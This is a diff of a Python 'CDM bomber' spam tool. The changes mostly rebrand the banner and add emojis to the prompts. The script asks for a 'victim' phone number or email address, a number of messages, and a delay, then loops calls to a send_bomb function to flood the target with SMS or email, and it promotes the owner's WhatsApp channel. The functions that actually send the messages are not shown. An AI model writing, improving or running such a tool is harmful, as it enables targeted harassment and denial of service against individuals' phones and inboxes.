@@ -23,9 +23,9 @@ async def send_bomb(session, method, target):
         return False
 
 async def bomber(method):
-    target = input("\nENTER YOUR VICTIM " + ("NUMBER (e.g. +243861009310): " if method == "phone" else "EMAIL: "))
-    count = int(input(" ENTER AMOUNT OF BOMBING: "))
-    delay = float(input(" ENTER SCE OF DELAYS (seconds): "))
+    target = input("\n🎯 ENTER YOUR VICTIM " + ("NUMBER (e.g. +243861009310): " if method == "phone" else "EMAIL: "))
+    count = int(input("🔁 ENTER AMOUNT OF BOMBING: "))
+    delay = float(input("⏱️ ENTER SCE OF DELAYS (seconds): "))
 
     success = 0
     failed = 0
@@ -39,51 +39,36 @@ async def bomber(method):
                 failed += 1
 
             percent = int((i + 1) / count * 100)
-            bar = '*' * (percent // 10) + "░" * (10 - percent // 10)
-            print(f"\r Progress: [{bar}] {percent}% | {success}  {failed}", end="")
+            bar = "█" * (percent // 10) + "░" * (10 - percent // 10)
+            print(f"\r📡 Progress: [{bar}] {percent}% | ✅ {success} ❌ {failed}", end="")
             await asyncio.sleep(delay)
 
-    print(f"\n\nDone!\nTotal Sent: {count}\n Success: {success},  Failed: {failed}")
+    print(f"\n\n✅ Done!\nTotal Sent: {count}\n🟢 Success: {success}, 🔴 Failed: {failed}")
 
 async def main():
-    print(" JOIN OWNER WHATSAPP CHANNEL: https://whatsapp.com/channel/0029VbCArXO2phHPux5T8D3K")
-    input("\n Press Enter to continue...")
+    print("🔗 JOIN OWNER WHATSAPP CHANNEL: https://whatsapp.com/channel/0029VbCArXO2phHPux5T8D3K")
+    input("\n👉 Press Enter to continue...")
     clear()
 
-    
-print("╔════════════════════════════╗")
-    print("║ SKY PLUG CDM SPAM TOOL  
-███████╗██╗  ██╗██╗   ██╗
-██╔════╝██║ ██╔╝╚██╗ ██╔╝
-███████╗█████╔╝  ╚████╔╝
-╚════██║██╔═██╗   ╚██╔╝
-███████║██║  ██╗   ██║
-╚══════╝╚═╝  ╚═╝   ╚═╝
-"
-
-██████╗ ██╗     ██╗   ██╗ ██████╗
-██╔══██╗██║     ██║   ██║██╔════╝
-██████╔╝██║     ██║   ██║██║  ███╗
-██╔═══╝ ██║     ██║   ██║██║   ██║
-██║     ███████╗╚██████╔╝╚██████╔╝
-╚═╝     ╚══════╝ ╚═════╝  ╚═════╝    ║")
+    print("╔════════════════════════════╗")
+    print("║SKY PLUG X Darkseid CDM SPAM     ║")
     print("║     CDM BOMBER TOOL       ║")
     print("╚════════════════════════════╝\n")
 
-    print(" ENTER 1 TO SMS BOMBING")
-    print("  ENTER 2 TO EMAIL BOMBING")
+    print("📱 ENTER 1 TO SMS BOMBING")
+    print("✉️  ENTER 2 TO EMAIL BOMBING")
     
-    choice = input("\n ENTER YOUR CHOICE: ").strip()
+    choice = input("\n🎯 ENTER YOUR CHOICE: ").strip()
 
     if choice == "1":
         await bomber("phone")
     elif choice == "2":
         await bomber("email")
     else:
-        print("Invalid choice. Exiting...")
+        print("❌ Invalid choice. Exiting...")
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n Tool stopped by user.")
+        print("\n🚫 Tool stopped by user.")
